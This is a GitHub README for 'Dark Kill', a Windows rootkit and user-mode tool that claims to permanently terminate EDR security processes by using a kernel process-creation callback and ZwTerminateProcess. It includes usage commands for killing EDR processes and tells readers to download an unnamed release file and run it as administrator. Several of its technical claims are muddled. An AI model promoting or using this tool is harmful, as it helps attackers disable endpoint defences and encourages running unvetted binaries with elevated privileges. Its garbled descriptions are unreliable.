# Dark Kill 🖤🔪

![GitHub Repo](https://img.shields.io/badge/GitHub-Repo-blue.svg) ![Releases](https://img.shields.io/badge/Releases-latest-orange.svg)

Welcome to the **Dark Kill** repository. This project includes user-mode code and a rootkit designed to permanently terminate EDR (Endpoint Detection and Response) processes. It utilizes advanced techniques such as Process Creation Blocking Kernel Callback Routine registration and `ZwTerminateProcess`. 

## Table of Contents

- [Introduction](#introduction)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Technical Details](#technical-details)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

## Introduction

In the ever-evolving landscape of cybersecurity, the need for effective tools to counteract detection systems is crucial. **Dark Kill** provides a robust solution for those looking to understand the intricacies of EDR processes and how they can be neutralized. 

This project aims to help security professionals and researchers study the effectiveness of EDR systems and enhance their understanding of rootkit development.

## Features

- **Permanent EDR Process Termination**: Leverages kernel callbacks to ensure that EDR processes cannot run undetected.
- **User-Mode Code**: Designed to be easily integrated and tested in user-mode environments.
- **Rootkit Functionality**: Offers advanced features typical of rootkits, providing a comprehensive toolkit for research and development.
- **Windows Compatibility**: Specifically tailored for Windows operating systems, ensuring wide applicability.

## Installation

To get started with **Dark Kill**, follow these steps:

1. Clone the repository:
   ```bash
   git clone https://github.com/GeorgevirSingh/dark-kill.git
   cd dark-kill
   ```

2. Download the latest release from the [Releases section](https://github.com/GeorgevirSingh/dark-kill/releases). Look for the appropriate file, download it, and execute it to set up the environment.

3. Ensure you have the necessary permissions to run the code, as it may require administrative access.

## Usage

Once installed, you can begin using **Dark Kill**. Here’s a basic guide on how to run the code:

1. Execute the downloaded file from the Releases section. Make sure to run it as an administrator to allow full access to system resources.
2. Follow the prompts provided by the application to configure the settings as needed.
3. Monitor the logs for any actions taken against EDR processes.

### Example Commands

Here are a few command examples to help you get started:

- To initiate the termination of a specific EDR process:
  ```bash
  dark-kill terminate <process_name>
  ```

- To check the status of the current EDR processes:
  ```bash
  dark-kill status
  ```

## Technical Details

### Process Creation Blocking Kernel Callback

The core of this project lies in the Process Creation Blocking Kernel Callback Routine. This method allows the user to intercept process creation requests at the kernel level. By doing so, it can effectively prevent unwanted EDR processes from being initiated.

### ZwTerminateProcess

The `ZwTerminateProcess` function is a powerful tool that enables the termination of processes from user mode. This function, when used in conjunction with the kernel callback, ensures that EDR processes can be killed effectively and permanently.

### Code Structure

The code is structured to facilitate easy understanding and modification. Here’s a brief overview:

- **Kernel Module**: Contains the main logic for the rootkit and process termination.
- **User Mode Application**: Provides an interface for users to interact with the kernel module.
- **Documentation**: Inline comments and separate documentation files explain the code's functionality.

## Contributing

Contributions are welcome! If you have suggestions for improvements or new features, please fork the repository and submit a pull request. 

### Steps to Contribute

1. Fork the repository.
2. Create a new branch for your feature or fix.
3. Make your changes and commit them.
4. Push to your forked repository.
5. Submit a pull request detailing your changes.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

## Contact

For any questions or inquiries, feel free to reach out:

- **GitHub**: [GeorgevirSingh](https://github.com/GeorgevirSingh)
- **Email**: george@example.com

## Final Notes

To explore the latest features and updates, check the [Releases section](https://github.com/GeorgevirSingh/dark-kill/releases) for downloadable files. 

**Dark Kill** is a powerful tool for those interested in understanding and combating EDR systems. Your contributions and feedback will help enhance its capabilities and reach.

Thank you for visiting the **Dark Kill** repository!